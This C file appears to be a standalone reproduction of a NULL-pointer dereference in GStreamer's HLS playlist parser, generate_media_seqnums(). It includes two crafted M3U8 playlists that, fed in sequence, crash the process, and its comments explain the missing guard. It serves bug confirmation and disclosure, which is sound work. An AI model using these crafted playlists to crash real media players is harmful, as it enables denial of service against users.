/*
 * Standalone repro for candidate 027: NULL-pointer dereference in
 * generate_media_seqnums() in subprojects/gst-plugins-bad/ext/hls/m3u8.c.
 *
 * This mirrors the project's own unit-test convention (see
 * subprojects/gst-plugins-bad/tests/check/elements/hlsdemux_m3u8.c) of directly
 * #include-ing m3u8.c to reach its internal (non-exported) statics and struct
 * layout, then drives the real, unmodified gst_m3u8_update() entry point - the
 * same function gsthlsdemux.c calls with the text of a downloaded playlist -
 * with hand-crafted but well-formed M3U8 playlist text. This is the genuine
 * external input format (a downloaded playlist file), not a stand-in for a
 * second network participant, so a single-process repro is sufficient per
 * CONFIRMATION.md section 11.
 *
 * Trigger: a live media-playlist update sequence where
 *   1) the first gst_m3u8_update() call populates self->files with >=1 entry
 *      (this becomes "previous_files" on the next update), and
 *   2) the second gst_m3u8_update() call supplies a playlist with NO media
 *      segments (self->files stays NULL after parsing) and NO
 *      #EXT-X-MEDIA-SEQUENCE tag (have_mediasequence == FALSE), so
 *      gst_m3u8_update() takes the generate_media_seqnums() branch.
 *
 * generate_media_seqnums()'s "no match" for-loop
 *   for (l = self->files; l; l = l->next) { ... }
 * never executes when self->files is NULL, so f2 is never assigned away
 * from its NULL initializer. The function then falls into:
 *   } else {
 *     mediasequence = f2->sequence + 1;   <-- NULL pointer dereference
 *     ...
 * check_media_seqnums(), right above it in the same file, has a matching
 * "if (!self->files) return TRUE;" guard that generate_media_seqnums() lacks.
 */

#undef GST_CAT_DEFAULT
#include "m3u8.h"
#include "m3u8.c"

GST_DEBUG_CATEGORY (hls_debug);

static const gchar *FIRST_PLAYLIST = "#EXTM3U\n"
    "#EXT-X-TARGETDURATION:10\n"
    "#EXTINF:10,\n" "http://media.example.com/001.ts\n";

/* No segments, no #EXT-X-MEDIA-SEQUENCE: triggers the missing guard. */
static const gchar *SECOND_PLAYLIST = "#EXTM3U\n" "#EXT-X-TARGETDURATION:10\n";

int
main (int argc, char **argv)
{
  gst_init (&argc, &argv);

  GstM3U8 *pl = gst_m3u8_new ();

  gboolean ret1 = gst_m3u8_update (pl, g_strdup (FIRST_PLAYLIST));
  g_print ("First update returned: %d, files after first update: %d\n",
      ret1, g_list_length (pl->files));

  g_print ("Calling second update with an empty-of-segments playlist "
      "(previous_files non-empty, no EXT-X-MEDIA-SEQUENCE) ...\n");

  /* This call crashes with a NULL-pointer dereference inside
   * generate_media_seqnums() before this printf's result would ever be seen. */
  gboolean ret2 = gst_m3u8_update (pl, g_strdup (SECOND_PLAYLIST));

  g_print ("Second update returned: %d (bug not triggered)\n", ret2);

  gst_m3u8_unref (pl);
  return 0;
}
